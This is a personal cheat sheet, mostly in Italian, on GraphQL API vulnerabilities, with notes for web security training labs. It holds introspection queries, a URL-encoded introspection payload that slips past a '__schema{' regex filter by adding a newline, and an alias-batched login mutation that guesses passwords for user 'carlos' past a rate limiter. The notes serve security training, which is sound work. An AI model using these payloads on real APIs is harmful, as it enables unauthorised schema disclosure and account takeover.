

```
###. GraphQL API - Vulnerabilities


# GraphQL Introspection:

L'introspezione è una funzione GraphQL incorporata che consente di interrogare un server per ottenere informazioni sullo schema. È comunemente utilizzato da applicazioni come IDE GraphQL e strumenti di generazione di documentazione.

Come le normali query, puoi specificare i campi e la struttura della risposta che desideri ricevere. Per esempio, potresti volere che la risposta contenga solo i nomi delle mutazioni disponibili.

L'introspezione può rappresentare un grave rischio di divulgazione di informazioni , poiché può essere utilizzata per accedere a informazioni potenzialmente sensibili informazioni (come le descrizioni dei campi) e aiutano un utente malintenzionato a scoprire come interagire con l'API. È best practice per disabilitare l'introspezione negli ambienti di produzione.

GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D  
Introspection codificati

"query":"{__schema{types{name, fields{name}}}}"
"query":"{__schema {types{name,kind,description}}}"  
"query":"{__schema{types{name,fields{name},kind,description}}}"





GraphQL - Vojager

```
  




```


###. GraphQL Utils:

# GraphQL - Universal Query:
> /api?query=query{__typename}

#. Query: Le query recuperano i dati.
- Mutation: Le mutazioni aggiungono, modificano o rimuovono dati.
- Subscriptions: Le sottoscrizioni sono simili alle query, ma impostano una connessione permanente tramite la quale un server può inviare in modo proattivo i dati a un client nel formato specificato. 
- Frammenti: Sono parti riutilizzabili di query o mutazioni.  Contengono un sottoinsieme dei campi appartenenti alla tipologia.
- Alias: Restituisce il file product con la stessa proprietà 2 volte utilizzando alias.

#. GraphQL - Alias:
-> Alias - Invalid query
query getProductDetails {
    getProduct(id: 1) {
        id
        name
    }
    getProduct(id: 2) {
        id
        name
    }
} 

--------------------------------------------------------------------------------------

-> Alias - Valid query using aliases
 query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }

    product2: getProduct(id: "2") {
        id
        name
    }
}



GraphQL - Create Request with Input Object:

> mutation createUser {
  createUser(input: {
      username: "test", 
      email: "test@test.cz", 
      phone: "479332973", 
      firstName: "David", 
      lastName: "Test"
    })

> mutation {
    sendEmailToFriend(input:
     {
        product_id:"1", 
        recipients: {  
            email: "test@asd.com", 
            name:"test"
        },
        sender: {
            email: "test@asd.com", 
            message: "message", 
            name:"test"
        }
     }
    )

query {
    isEmailAvailable(email: "asd") {
    is_email_available # Indicates whether the specified email address can be used to create a customer.
    }
}

```




```
### GraphQL - Lab Apprentice

#1. Lab: Accessing private GraphQL posts:
> Find the POST /graphql/v1 request. Right-click it and select Send to Repeater.
> In Repeater, right-click anywhere in the Request panel of the message editor and select GraphQL > Set introspection query to insert an introspection query into the request body.


#2. Lab: Accidental exposure of private GraphQL fields:
> In Repeater, "select GraphQL" > "Set introspection query" to insert an introspection query into the request body.
> GraphQL > Save GraphQL queries to site map
> Go to Target > Site map and review the GraphQL queries. Notice the following.
There is a getUser query that returns a user's username and password.



```

```
### GraphQL - Lab Practitioner

#3. Lab: Finding a hidden GraphQL endpoint:
> Send a universal query.
For example: /api?query=query{__typename}.
> Send a introspection query URL Encoded:
/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
> Notice from the response that introspection is disallowed
> Modify the query to include a newline character after __schema and resend.
> /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
> Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex "__schema{"
> Right-click the request and select GraphQL > Save GraphQL queries to site map.
> Go to Target > Site map to see the API queries. Use the GraphQL tab and find the getUser query. Right-click the request and select Send to Repeater.




#4. Lab: Bypassing GraphQL brute force protections
The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
   mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

          bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }




#5. Lab: Performing CSRF exploits over GraphQL


```

```
### GraphQL - Lab Expert
```

```
### GraphQL - Lab Extra
